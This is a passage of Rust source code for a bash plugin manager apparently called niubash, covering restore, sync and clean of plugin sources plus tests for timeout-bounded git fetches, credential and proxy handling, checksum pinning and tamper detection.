            };
        let degraded = missing || drifted;
        let degraded_reason = if missing {
            Some(DEGRADED_MISSING.to_string())
        } else if drifted {
            Some(DEGRADED_DRIFTED.to_string())
        } else {
            None
        };
        let (assets, adapter_display) = match adapter {
            Some(adapter) if !missing => (
                adapter.list_assets(&record.path),
                adapter.display_name().to_string(),
            ),
            Some(adapter) => (Vec::new(), adapter.display_name().to_string()),
            None => (Vec::new(), record.adapter.clone()),
        };
        let state = if degraded {
            "degraded".to_string()
        } else if !record.trusted {
            "untrusted".to_string()
        } else {
            "ready".to_string()
        };
        let mut kinds: Vec<String> = assets
            .iter()
            .map(|asset| asset.kind.as_str().to_string())
            .collect();
        kinds.dedup();
        out.push(SourceStatus {
            degraded,
            degraded_reason,
            state,
            asset_count: (!degraded).then_some(assets.len()),
            asset_kinds: kinds,
            adapter_display,
            record,
        });
    }
    out.sort_by(|left, right| left.record.id.cmp(&right.record.id));
    out
}

/// Result row of `restore_source` / `sync_sources`.
#[derive(Debug, Clone, Serialize)]
pub struct SourceSyncOutcome {
    pub id: String,
    pub outcome: String,
    pub detail: String,
}

/// Restore a source to the exact state pinned in the registry lockfile
/// (lazy.nvim `:Lazy restore` semantics): re-fetch the recorded commit (or
/// ref), verify against the recorded checksum, replace the tree in place.
/// Local-path origins cannot rebuild a tree; those restore attempts explain
/// and fail (reinstall from the origin instead).
pub fn restore_source(id: &str) -> anyhow::Result<SourceSyncOutcome> {
    let mut registry = read_source_registry();
    let index = registry
        .iter()
        .position(|record| record.id == id)
        .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
    let record = registry[index].clone();
    if record.ref_name == LOCAL_ORIGIN_REF && record.commit_sha.is_none() {
        anyhow::bail!(
            "source '{id}' was installed from a local directory snapshot; \
             there is no upstream to restore from — reinstall it from the tree"
        );
    }
    let fetched = fetch_source_to_staging(&SourceInstallRequest {
        adapter: Some(record.adapter.clone()),
        origin: record.url.clone(),
        commit: record.commit_sha.clone(),
        ref_name: if record.commit_sha.is_some() {
            None
        } else {
            Some(record.ref_name.clone())
        },
        expected_checksum: Some(record.checksum_sha256.clone()),
        id: None,
        entry: None,
        fetch_budget: None,
        credential_guard: false,
    })?;
    remove_tree_if_present(&record.path)
        .with_context(|| format!("failed to remove tree {}", record.path.display()))?;
    promote_staging(&fetched.staging, &record.path)?;
    registry[index].installed_at = now_timestamp();
    write_source_registry(&registry)?;
    // The tree now matches the pin again: the rc drift guard must go quiet
    // (niubash#297).
    clear_drifted_source(id)?;
    Ok(SourceSyncOutcome {
        id: record.id.clone(),
        outcome: "restored".to_string(),
        // Honest wording (niubash#297): restore REBUILDS the tree from the
        // lockfile pin and verifies the fetched result against it — it does
        // not find a tree that "matches" in place.
        detail: format!(
            "rebuilt from the lockfile pin ({}, checksum verified)",
            record
                .commit_sha
                .as_deref()
                .map(|sha| format!("commit {sha}"))
                .unwrap_or_else(|| record.ref_name.clone()),
        ),
    })
}

/// `niu plugin sync` (vim-plug `:PlugUpdate` semantics): update every
/// git-origin source to its recorded ref's current tip. Local snapshots are
/// reported as skipped. Returns one row per source.
pub fn sync_sources() -> Vec<SourceSyncOutcome> {
    let mut out = Vec::new();
    for record in read_source_registry() {
        if record.ref_name == LOCAL_ORIGIN_REF && record.commit_sha.is_none() {
            out.push(SourceSyncOutcome {
                id: record.id.clone(),
                outcome: "skipped".to_string(),
                detail: "local snapshot — update by reinstalling from the tree".to_string(),
            });
            continue;
        }
        let ref_name = if record.ref_name == LOCAL_ORIGIN_REF {
            "HEAD".to_string()
        } else {
            record.ref_name.clone()
        };
        match update_source(
            &record.id,
            SourceInstallRequest {
                adapter: Some(record.adapter.clone()),
                origin: record.url.clone(),
                ref_name: Some(ref_name),
                ..SourceInstallRequest::default()
            },
        ) {
            Ok(summary) => out.push(SourceSyncOutcome {
                id: record.id.clone(),
                outcome: "updated".to_string(),
                detail: format!("now at {} ({})", summary.version, summary.checksum_sha256),
            }),
            Err(err) => out.push(SourceSyncOutcome {
                id: record.id.clone(),
                outcome: "failed".to_string(),
                detail: err.to_string(),
            }),
        }
    }
    out
}

/// `niu plugin clean` (vim-plug `:PlugClean` semantics): remove leftover
/// `.staging-*` directories from interrupted installs, and handle orphaned
/// trees under the sources root that no registry record claims
/// (niubash#299). With `delete_orphans = false` every orphan directory is
/// only LISTED (`outcome = "orphan"`); `--orphans` is the explicit confirm
/// that deletes them. Registered sources are never touched.
pub fn clean_sources(delete_orphans: bool) -> Vec<SourceSyncOutcome> {
    let mut out = Vec::new();
    let root = sources_root();
    let registered: Vec<PathBuf> = read_source_registry()
        .into_iter()
        .map(|record| record.path.clone())
        .collect();
    let Ok(entries) = fs::read_dir(&root) else {
        return out;
    };
    for entry in entries.filter_map(Result::ok) {
        let path = entry.path();
        let Some(name) = entry.file_name().into_string().ok() else {
            continue;
        };
        if !path.is_dir() {
            continue;
        }
        if name.starts_with(".staging-") {
            match fs::remove_dir_all(&path) {
                Ok(()) => out.push(SourceSyncOutcome {
                    id: name.clone(),
                    outcome: "removed".to_string(),
                    detail: "interrupted-install staging directory".to_string(),
                }),
                Err(err) => out.push(SourceSyncOutcome {
                    id: name.clone(),
                    outcome: "failed".to_string(),
                    detail: err.to_string(),
                }),
            }
            continue;
        }
        if registered.contains(&path) {
            continue;
        }
        // Orphan (niubash#299): ANY directory no registry record claims —
        // manager-shaped trees, wild trees, hand-copied dirs. The plain
        // clean only reports it; deletion is `--orphans`' explicit job, so
        // a directory niu never placed here is never silently destroyed.
        if delete_orphans {
            match fs::remove_dir_all(&path) {
                Ok(()) => out.push(SourceSyncOutcome {
                    id: name.clone(),
                    outcome: "removed".to_string(),
                    detail: "orphaned directory (no registry record)".to_string(),
                }),
                Err(err) => out.push(SourceSyncOutcome {
                    id: name.clone(),
                    outcome: "failed".to_string(),
                    detail: err.to_string(),
                }),
            }
        } else {
            out.push(SourceSyncOutcome {
                id: name,
                outcome: "orphan".to_string(),
                detail: "not claimed by the registry — `niu plugin clean --orphans` \
                         deletes it"
                    .to_string(),
            });
        }
    }
    out
}

/// A theme asset exposed by an installed, trusted source.
#[derive(Debug, Clone, Serialize)]
pub struct SourceThemeEntry {
    pub name: String,
    pub path: PathBuf,
    pub source_id: String,
    pub adapter_display: String,
}

/// Theme entries contributed by trusted, non-degraded sources (§11.3:
/// external-first layer between user TOML themes and bundle-native themes).
pub fn source_theme_entries() -> Vec<SourceThemeEntry> {
    let mut out = Vec::new();
    for status in list_sources() {
        if status.degraded || !status.record.trusted {
            continue;
        }
        let Some(adapter) = adapter_for(&status.record.adapter) else {
            continue;
        };
        for asset in adapter.list_assets(&status.record.path) {
            if asset.kind == SourceAssetKind::Theme {
                out.push(SourceThemeEntry {
                    name: asset.name,
                    path: asset.path,
                    source_id: status.record.id.clone(),
                    adapter_display: adapter.display_name().to_string(),
                });
            }
        }
    }
    out
}

/// Strip the `native:` override prefix (§11.3 rule 2): `native:<name>` skips
/// the external-source layer and reaches the built-in assets directly.
pub fn strip_native_override(name: &str) -> &str {
    name.strip_prefix("native:").unwrap_or(name)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_support::PROCESS_STATE_LOCK;

    struct EnvVarGuard {
        name: &'static str,
        previous: Option<std::ffi::OsString>,
    }

    impl EnvVarGuard {
        fn set(name: &'static str, value: &Path) -> Self {
            let previous = std::env::var_os(name);
            std::env::set_var(name, value);
            Self { name, previous }
        }

        fn set_os(name: &'static str, value: &std::ffi::OsStr) -> Self {
            let previous = std::env::var_os(name);
            std::env::set_var(name, value);
            Self { name, previous }
        }

        fn remove(name: &'static str) -> Self {
            let previous = std::env::var_os(name);
            std::env::remove_var(name);
            Self { name, previous }
        }
    }

    impl Drop for EnvVarGuard {
        fn drop(&mut self) {
            match &self.previous {
                Some(value) => std::env::set_var(self.name, value),
                None => std::env::remove_var(self.name),
            }
        }
    }

    fn unique_temp_dir(label: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "niu-sources-{}-{}-{}",
            label,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// A Command that sleeps well past any test budget (bounded-runner
    /// tests kill it).
    fn sleeping_command() -> Command {
        if cfg!(windows) {
            let mut command = Command::new("cmd");
            command.args(["/c", "ping", "-n", "30", "127.0.0.1", ">nul"]);
            command
        } else {
            let mut command = Command::new("sleep");
            command.arg("30");
            command
        }
    }

    /// The bounded git runner kills a hung child at the deadline and says
    /// so, naming the origin (the slowsource P0 bounded the startup fetch;
    /// niubash#293 extends the bound to the explicit verbs — the error must
    /// say WHICH source hung).
    #[test]
    fn run_git_bounded_kills_a_hung_child_at_the_deadline() {
        let start = Instant::now();
        let err = run_git_bounded(
            sleeping_command(),
            FetchLimits {
                deadline: Some(Instant::now() + Duration::from_millis(250)),
                budget: Some(Duration::from_secs(120)),
                credential_guard: false,
            },
            "clone",
            "https://blackhole.example/repo.git",
        )
        .expect_err("a killed child must fail the run");
        let message = err.to_string();
        assert!(message.contains("timed out"), "{message}");
        assert!(
            message.contains("https://blackhole.example/repo.git"),
            "the timeout must name the origin: {message}"
        );
        assert!(
            message.contains("120"),
            "the budget is in the message: {message}"
        );
        assert!(
            start.elapsed() < Duration::from_secs(5),
            "the kill must land at the deadline, took {:?}",
            start.elapsed()
        );
    }

    /// Without a deadline the same runner behaves like the old `status()`:
    /// success passes, a non-zero exit reports the status (and names the
    /// origin, so a multi-source report is attributable).
    #[test]
    fn run_git_bounded_unbudgeted_propagates_exit_status() {
        let mut ok = Command::new(if cfg!(windows) { "cmd" } else { "true" });
        if cfg!(windows) {
            ok.args(["/c", "exit", "0"]);
        }
        run_git_bounded(
            ok,
            FetchLimits::default(),
            "init",
            "https://exit-code.example/ok.git",
        )
        .expect("exit 0 must pass");

        let mut bad = Command::new(if cfg!(windows) { "cmd" } else { "false" });
        if cfg!(windows) {
            bad.args(["/c", "exit", "3"]);
        }
        let err = run_git_bounded(
            bad,
            FetchLimits::default(),
            "fetch",
            "https://exit-code.example/bad.git",
        )
        .expect_err("exit 3 must fail");
        assert!(err.to_string().contains("status 3"), "{err}");
        assert!(err.to_string().contains("exit-code.example"), "{err}");
    }

    /// The guards are plain env overrides on the spawned command —
    /// assert them on the Command itself (no process needed).
    #[test]
    fn credential_guards_are_applied_to_the_command() {
        let mut command = Command::new("git");
        command
            .env("GIT_TERMINAL_PROMPT", "1")
            .env("GIT_ASKPASS", "gui-askpass");
        apply_credential_guards(&mut command);
        let env_of = |key: &str| {
            command
                .get_envs()
                .find(|(name, _)| *name == std::ffi::OsStr::new(key))
                .and_then(|(_, value)| value)
                .and_then(|value| value.to_str())
        };
        assert_eq!(env_of("GIT_TERMINAL_PROMPT"), Some("0"));
        assert_eq!(env_of("GIT_ASKPASS"), Some("echo"));
    }

    /// niubash#294: the proxy environment rides onto every spawned git
    /// command — and an uppercase-only environment (the field shape: the
    /// user exported `HTTPS_PROXY`, a wrapper layer dropped the lowercase
    /// variant) yields a spelling curl inside git honors regardless of the
    /// platform's case rules. Absent variables are never invented. (Env
    /// names are case-insensitive on Windows, so the guards here clear by
    /// one spelling and every command-env lookup ignores case.)
    #[test]
    fn proxy_environment_is_forwarded_and_case_mirrored() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        // Clear-then-set, declared so the reverse drop order restores the
        // original block exactly (a Windows remove is case-insensitive).
        let _clear_https_upper = EnvVarGuard::remove("HTTPS_PROXY");
        let _clear_https_lower = EnvVarGuard::remove("https_proxy");
        let _https = EnvVarGuard::set_os(
            "HTTPS_PROXY",
            std::ffi::OsStr::new("http://proxy.example:7890"),
        );
        let _clear_http_upper = EnvVarGuard::remove("HTTP_PROXY");
        let _clear_http_lower = EnvVarGuard::remove("http_proxy");
        let _clear_all_upper = EnvVarGuard::remove("ALL_PROXY");
        let _clear_all_lower = EnvVarGuard::remove("all_proxy");
        let _clear_no_upper = EnvVarGuard::remove("NO_PROXY");
        let _clear_no_lower = EnvVarGuard::remove("no_proxy");

        let mut command = Command::new("git");
        apply_proxy_passthrough(&mut command);
        // Case-insensitive on purpose: the child block carries ONE
        // https_proxy variable under some spelling — every lookup must
        // find the forwarded value.
        let value_for = |key: &str| {
            command
                .get_envs()
                .filter(|(name, _)| {
                    name.to_str()
                        .is_some_and(|name| name.eq_ignore_ascii_case(key))
                })
                .find_map(|(_, value)| value)
                .and_then(|value| value.to_str())
        };
        assert_eq!(value_for("HTTPS_PROXY"), Some("http://proxy.example:7890"));
        assert_eq!(
            value_for("https_proxy"),
            Some("http://proxy.example:7890"),
            "a lowercase spelling must exist for curl's case-sensitive lookup"
        );
        assert_eq!(
            value_for("HTTP_PROXY"),
            None,
            "absent variables are not invented"
        );
        assert_eq!(value_for("ALL_PROXY"), None);
        assert_eq!(value_for("NO_PROXY"), None);
        assert_eq!(value_for("no_proxy"), None);
    }

    /// niubash#293: an explicit verb with no `fetch_budget` gets the verb
    /// budget (`NIU_PLUGIN_FETCH_TIMEOUT_MS` here), so a blackholed origin
    /// fails BOUNDED and the error names the origin — it used to hang the
    /// verb until the user killed niu.
    #[test]
    fn verb_fetch_budget_bounds_an_explicit_fetch_by_default() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("verb-budget");
        let root = temp.join("sources");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let _spec = EnvVarGuard::set("NIU_PLUGIN_SPEC", &temp.join("plugins.toml"));
        let _budget =
            EnvVarGuard::set_os("NIU_PLUGIN_FETCH_TIMEOUT_MS", std::ffi::OsStr::new("300"));

        let start = Instant::now();
        let err = install_or_adopt(SourceInstallRequest {
            // RFC 5737 TEST-NET-3: never routable, so the clone hangs in
            // the connect phase instead of failing fast.
            origin: "https://203.0.113.1/repo.git".to_string(),
            ..SourceInstallRequest::default()
        })
        .expect_err("a blackholed fetch must fail at the verb budget");
        assert!(
            start.elapsed() < Duration::from_secs(10),
            "the verb budget must bound the fetch, took {:?}",
            start.elapsed()
        );
        let message = err.to_string();
        assert!(message.contains("timed out"), "{message}");
        assert!(
            message.contains("203.0.113.1"),
            "the timeout must name the source: {message}"
        );
        // The killed fetch leaves no staging churn behind.
        let leftovers: Vec<String> = fs::read_dir(&root)
            .unwrap()
            .filter_map(Result::ok)
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .collect();
        assert!(
            leftovers.iter().all(|name| name == "registry.toml"),
            "no staging leftovers: {leftovers:?}"
        );

        let _ = fs::remove_dir_all(&temp);
    }

    fn write_omb_fixture(root: &Path, marker: &str) {
        fs::create_dir_all(root.join("themes/robbyrussell")).unwrap();
        fs::create_dir_all(root.join("themes/agnoster")).unwrap();
        fs::create_dir_all(root.join("plugins/git")).unwrap();
        fs::create_dir_all(root.join("aliases")).unwrap();
        fs::create_dir_all(root.join("completions")).unwrap();
        fs::write(
            root.join("oh-my-bash.sh"),
            "#!/usr/bin/env bash\ncase $- in *i*) ;; *) return;; esac\n\
             _omb_util_print() { printf '%s\\n' \"$*\"; }\n",
        )
        .unwrap();
        fs::write(
            root.join("themes/robbyrussell/robbyrussell.theme.sh"),
            format!("# marker={marker}\nPS1='➜ %~ '\n"),
        )
        .unwrap();
        fs::write(
            root.join("themes/agnoster/agnoster.theme.sh"),
            format!("# marker={marker}\nPS1='%(?)%~# '\n"),
        )
        .unwrap();
        fs::write(
            root.join("plugins/git/git.plugin.sh"),
            format!("# marker={marker}\nalias gg='git status'\n"),
        )
        .unwrap();
        fs::write(
            root.join("aliases/cargo.aliases.sh"),
            "alias cb='cargo build'\n",
        )
        .unwrap();
        fs::write(
            root.join("completions/git.completion.sh"),
            format!("# marker={marker}\n_omb_completion_git_stub() {{ :; }}\n"),
        )
        .unwrap();
    }

    /// Minimal bash-it-shaped fixture (corpus layout:
    /// `D:/repo/rubash/target-ecosys/repos/bash-it`).
    fn write_bash_it_fixture(root: &Path, marker: &str) {
        fs::create_dir_all(root.join("lib")).unwrap();
        fs::create_dir_all(root.join("aliases/available")).unwrap();
        fs::create_dir_all(root.join("plugins/available")).unwrap();
        fs::create_dir_all(root.join("completion/available")).unwrap();
        fs::create_dir_all(root.join("themes/demox")).unwrap();
        fs::write(
            root.join("bash_it.sh"),
            "#!/usr/bin/env bash\ncite() { :; }\nabout-plugin() { :; }\n\
             for _f in \"$BASH_IT/enabled\"/*.bash; do\n  [ -r \"$_f\" ] && . \"$_f\"\ndone\nunset _f\n",
        )
        .unwrap();
        fs::write(root.join("lib/composure.bash"), "# composure stub\n").unwrap();
        fs::write(
            root.join("aliases/available/apt.aliases.bash"),
            format!("# marker={marker}\nalias apts='apt search'\n"),
        )
        .unwrap();
        fs::write(
            root.join("plugins/available/base.plugin.bash"),
            "# BASH_IT_LOAD_PRIORITY: 350\n_about 'base helpers'\n_base_fn() { :; }\n",
        )
        .unwrap();
        fs::write(
            root.join("completion/available/docker.completion.bash"),
            "# docker completion stub\n",
        )
        .unwrap();
        fs::write(
            root.join("themes/demox/demox.theme.bash"),
            "PS1='demox> '\n",
        )
        .unwrap();
    }

    /// Minimal bash-completion-shaped fixture (corpus layout:
    /// `D:/repo/rubash/target-ecosys/repos/bash-completion`).
    fn write_bash_completion_fixture(root: &Path) {
        fs::create_dir_all(root.join("completions")).unwrap();
        fs::write(
            root.join("bash_completion"),
            "# bash_completion stub\nBASH_COMPLETION_STUB=1\n",
        )
        .unwrap();
        fs::write(root.join("completions/git.bash"), "# git completion stub\n").unwrap();
    }

    fn local_request(origin: &Path) -> SourceInstallRequest {
        SourceInstallRequest {
            adapter: None,
            origin: origin.to_string_lossy().into_owned(),
            ref_name: None,
            commit: None,
            expected_checksum: None,
            id: None,
            entry: None,
            fetch_budget: None,
            credential_guard: false,
        }
    }

    #[test]
    fn oh_my_bash_adapter_detects_layout_and_enumerates_assets() {
        let temp = unique_temp_dir("adapter-detect");
        write_omb_fixture(&temp, "v1");
        let adapter = adapter_for("oh-my-bash").unwrap();
        assert!(adapter.detect(&temp));
        // A niubash bundle tree is not an oh-my-bash tree.
        let bundle = unique_temp_dir("adapter-detect-bundle");
        fs::write(bundle.join("bundle.toml"), "name = \"x\"\n").unwrap();
        assert!(!adapter.detect(&bundle));
        assert!(detect_source_adapter(&bundle).is_none());

        let assets = adapter.list_assets(&temp);
        let names: Vec<(String, String)> = assets
            .iter()
            .map(|a| (a.kind.as_str().to_string(), a.name.clone()))
            .collect();
        assert!(
            names.contains(&("theme".into(), "agnoster".into())),
            "{names:?}"
        );
        assert!(
            names.contains(&("theme".into(), "robbyrussell".into())),
            "{names:?}"
        );
        assert!(
            names.contains(&("plugin".into(), "git".into())),
            "{names:?}"
        );
        assert!(
            names.contains(&("alias".into(), "cargo".into())),
            "{names:?}"
        );
        let _ = fs::remove_dir_all(&temp);
        let _ = fs::remove_dir_all(&bundle);
    }

    #[test]
    fn loader_snippet_is_guarded_and_sets_omb_channel() {
        let record = SourceRecord {
            id: "oh-my-bash".to_string(),
            adapter: "oh-my-bash".to_string(),
            url: "unused".to_string(),
            ref_name: LOCAL_ORIGIN_REF.to_string(),
            version: "unknown".to_string(),
            path: PathBuf::from("/unused/oh-my-bash"),
            trusted: true,
            license: "MIT".to_string(),
            checksum_sha256: "0".to_string(),
            installed_at: String::new(),
            commit_sha: None,
            trust_policy: TrustPolicy::default(),
            signature: None,
            previous: None,
            spec_enabled: None,
            spec_theme: None,
            first_fetch_verified: true,
        };
        let snippet = adapter_for("oh-my-bash").unwrap().loader_snippet(&record);
        assert!(snippet.contains("if [ -f "), "{snippet}");
        assert!(snippet.contains("/oh-my-bash/oh-my-bash.sh"), "{snippet}");
        assert!(snippet.contains("export OSH"), "{snippet}");
        // Separator normalization keeps OMB's internal globs working when
        // NIU_PLUGIN_SOURCES_ROOT is in Windows form (the closed
        // `${var//\\//}` substitution, same form as the rc HOME bootstrap).
        assert!(snippet.contains(r"${OSH//\\//}"), "{snippet}");
        assert!(snippet.contains("export NIU_THEME_SOURCE=omb"), "{snippet}");
        assert!(snippet.contains(". \"$OSH/oh-my-bash.sh\""), "{snippet}");
        // The snippet must not force a theme default: plugins-only
        // activation keeps the niubash prompt, and theme picks come from
        // the managed block's OSH_THEME line.
        assert!(!snippet.contains("OSH_THEME"), "{snippet}");
        // The fallback note must be visible in the snippet.
        assert!(
            snippet.contains("fallback stays active when absent"),
            "{snippet}"
        );
    }

    #[test]
    fn add_trust_remove_round_trip_local_origin() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("add-round-trip");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        // Removal is spec-aware since 1.3.1 (an uninstall drops the
        // declaration); keep the test off the real ~/.niubash spec.
        let _spec = EnvVarGuard::set("NIU_PLUGIN_SPEC", &temp.join("plugins.toml"));

        let record = add_source(local_request(&origin)).expect("add must succeed");
        assert_eq!(record.id, "oh-my-bash");
        assert!(!record.trusted, "new sources are untrusted");
        assert_eq!(record.license, "MIT");
        assert_eq!(record.ref_name, LOCAL_ORIGIN_REF);
        assert!(!record.checksum_sha256.is_empty());
        assert!(record.path.ends_with("oh-my-bash"));

        // Untrusted sources contribute no theme entries (execution gate).
        assert!(source_theme_entries().is_empty());

        let trusted = trust_source("oh-my-bash").expect("trust must succeed");
        assert!(trusted.trusted);
        let entries = source_theme_entries();
        let names: Vec<&str> = entries.iter().map(|e| e.name.as_str()).collect();
        assert!(names.contains(&"robbyrussell"), "{names:?}");
        assert!(names.contains(&"agnoster"), "{names:?}");

        let statuses = list_sources();
        assert_eq!(statuses.len(), 1);
        assert_eq!(statuses[0].state, "ready");
        assert_eq!(statuses[0].asset_count, Some(5));

        let removed = remove_source("oh-my-bash").expect("remove must succeed");
        assert!(!removed.exists());
        assert!(read_source_registry().is_empty());
        assert!(source_theme_entries().is_empty());

        let _ = fs::remove_dir_all(&temp);
    }

    /// §14.8 iron invariant, git side: a configured insteadOf mirror adds
    /// `-c url.<mirror>.insteadOf=https://github.com/` to every clone /
    /// fetch-by-sha invocation while the origin argument stays canonical
    /// (the registry keeps GitHub URLs; the mirror is transport-only).
    /// Exercised on the pure arg builder — the observable contract git
    /// receives; `git_fetch_commit_to` splices the very same
    /// `mirrors::git_clone_args(origin)` result into its subcommands.
    #[test]
    fn git_clone_args_carry_instead_of_mirror_for_github_origins_only() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("mirror-args");
        let config = temp.join("mirrors.toml");
        fs::write(
            &config,
            concat!(
                "schema = \"niubash:mirrors@0.1.0\"\n",
                "active = \"custom\"\n",
                "\n[github]\n",
                "git_instead_of = \"https://git.example.com/github.com\"\n",
            ),
        )
        .unwrap();
        let _guard = EnvVarGuard::set("NIU_MIRRORS", &config);

        let origin = "https://github.com/ohmybash/oh-my-bash.git";
        let args = clone_arg_list(origin, "HEAD", false);
        let expected_pair = [
            "-c",
            "url.https://git.example.com/github.com.insteadOf=https://github.com/",
        ];
        assert!(
            args.windows(2).any(|window| window == expected_pair),
            "clone args missing insteadOf pair: {args:?}"
        );
        // The credential guard rides only the budgeted (startup) path, and
        // its `-c` keys must precede the subcommand (see `run_git_bounded`).
        let guarded = clone_arg_list(origin, "HEAD", true);
        let clone_at = guarded
            .iter()
            .position(|arg| arg == "clone")
            .expect("clone subcommand present");
        assert!(
            guarded[..clone_at]
                .windows(2)
                .any(|window| window == ["-c", "credential.helper="]),
            "guarded clone args missing credential.helper=: {guarded:?}"
        );
        assert!(
            !args.contains(&"credential.helper=".to_string()),
            "explicit verbs keep git's own prompting: {args:?}"
        );
        // The origin handed to `git clone` is still the canonical URL —
        // git does the rewrite, the recorded origin never changes.
        assert_eq!(args.last().map(String::as_str), Some(origin));
        assert!(args.contains(&"clone".to_string()));

        // Without a mirror config the args carry no insteadOf keys.
        let _guard = EnvVarGuard::set("NIU_MIRRORS", &temp.join("absent.toml"));
        let args = clone_arg_list(origin, "v1", false);
        assert!(
            !args.iter().any(|arg| arg.contains("insteadOf")),
            "unexpected insteadOf without a mirror: {args:?}"
        );
        assert!(args.contains(&"--branch".to_string()));
        assert!(args.contains(&"v1".to_string()));

        // Local (non-GitHub) origins never get mirror config.
        let _guard = EnvVarGuard::set("NIU_MIRRORS", &config);
        let args = clone_arg_list("D:/repo/local-origin", LOCAL_ORIGIN_REF, false);
        assert!(
            !args.iter().any(|arg| arg.contains("insteadOf")),
            "local origin must not be mirrored: {args:?}"
        );

        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn add_rejects_checksum_mismatch_and_records_nothing() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("add-checksum");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);

        let request = SourceInstallRequest {
            expected_checksum: Some("deadbeef".to_string()),
            ..local_request(&origin)
        };
        let err = add_source(request).expect_err("mismatch must fail");
        assert!(err.to_string().contains("checksum mismatch"), "{err}");
        assert!(read_source_registry().is_empty());
        assert!(
            !root.join("oh-my-bash").exists(),
            "failed installs must not promote"
        );
        // No staging litter.
        let leftovers: Vec<_> = fs::read_dir(&root)
            .map(|entries| {
                entries
                    .filter_map(Result::ok)
                    .map(|e| e.file_name())
                    .collect()
            })
            .unwrap_or_default();
        assert!(
            !leftovers
                .iter()
                .any(|n| n.to_string_lossy().starts_with(".staging-")),
            "staging must be removed on failure: {leftovers:?}"
        );
        let _ = fs::remove_dir_all(&temp);
    }

    /// A pinned checksum must gate the ADOPTION path too (wt83 #173): an
    /// already-registered identity is only adopted when its recorded tree
    /// checksum matches the pin — otherwise the pin would be silently
    /// ignored exactly like the `plugin add` bug this closes.
    #[test]
    fn install_or_adopt_verifies_a_pinned_checksum_against_the_registered_tree() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("adopt-pin");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let record = add_source(local_request(&origin)).unwrap();

        // The matching pin adopts without a fetch.
        let (adopted, was_adopted) = install_or_adopt(SourceInstallRequest {
            expected_checksum: Some(record.checksum_sha256.clone()),
            ..local_request(&origin)
        })
        .expect("matching pin must adopt");
        assert!(was_adopted);
        assert_eq!(adopted.id, record.id);
        assert_eq!(read_source_registry().len(), 1);

        // A wrong pin is refused — nothing registered, nothing fetched.
        let err = install_or_adopt(SourceInstallRequest {
            expected_checksum: Some("deadbeef".to_string()),
            ..local_request(&origin)
        })
        .expect_err("wrong pin must be refused on adopt");
        assert!(err.to_string().contains("checksum mismatch"), "{err}");
        assert_eq!(read_source_registry().len(), 1);

        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn verify_detects_tampering() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("verify-tamper");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let record = add_source(local_request(&origin)).unwrap();

        let ok = verify_source("oh-my-bash").expect("verify must run");
        assert!(ok.verified, "{ok:?}");

        fs::write(
            root.join("oh-my-bash/themes/robbyrussell/robbyrussell.theme.sh"),
            "PS1='tampered'\n",
        )
        .unwrap();
        let bad = verify_source("oh-my-bash").expect("verify must run");
        assert!(!bad.verified, "{bad:?}");
        assert_eq!(bad.recorded_checksum, record.checksum_sha256);

        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn update_records_previous_and_rollback_restores_git_origin() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("update-rollback-git");
        let repo = temp.join("omb-repo");
        let root = temp.join("sources");
        // Two refs in one local git remote: v1 (install), v2 (update).
        write_omb_fixture(&repo, "v1");
        let git = |args: &[&str]| {
            let status = Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .status()
                .expect("git must be available");
            assert!(status.success(), "git {args:?} failed");
        };
        git(&["init", "-q"]);
        git(&["checkout", "-q", "-b", "v1"]);
        git(&["add", "-A"]);
        git(&[
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "v1",
        ]);
        git(&["checkout", "-q", "-b", "v2"]);
        write_omb_fixture(&repo, "v2");
        git(&["add", "-A"]);
        git(&[
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "v2",
        ]);

        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let request = |git_ref: &str| SourceInstallRequest {
            adapter: None,
            origin: repo.to_string_lossy().into_owned(),
            ref_name: Some(git_ref.to_string()),
            commit: None,
            expected_checksum: None,
            id: None,
            entry: None,
            fetch_budget: None,
            credential_guard: false,
        };
        let v1 = add_source(request("v1")).expect("install from git ref v1");
        trust_source("oh-my-bash").unwrap();

        let summary = update_source("oh-my-bash", request("v2")).expect("update to v2");
        assert_ne!(summary.checksum_sha256, v1.checksum_sha256);
        let previous = summary.previous.expect("previous recorded");
        assert_eq!(previous.ref_name, "v1");
